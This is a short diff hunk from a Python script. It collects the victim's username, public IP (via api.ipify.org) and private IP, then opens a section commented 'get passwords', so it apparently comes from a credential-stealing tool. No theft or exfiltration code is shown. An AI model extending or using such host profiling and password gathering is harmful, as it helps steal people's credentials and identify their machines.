@@ -20,7 +20,7 @@ import sys
 datetime = time.ctime(time.time())
 user = os.path.expanduser('~').split('\\')[2]
 publicIP = requests.get('https://api.ipify.org/').text
-#privateIP = socket.gethostbyname(socket.gethostname())
+privateIP = socket.gethostbyname(socket.gethostname())
 
 # get passwords
 
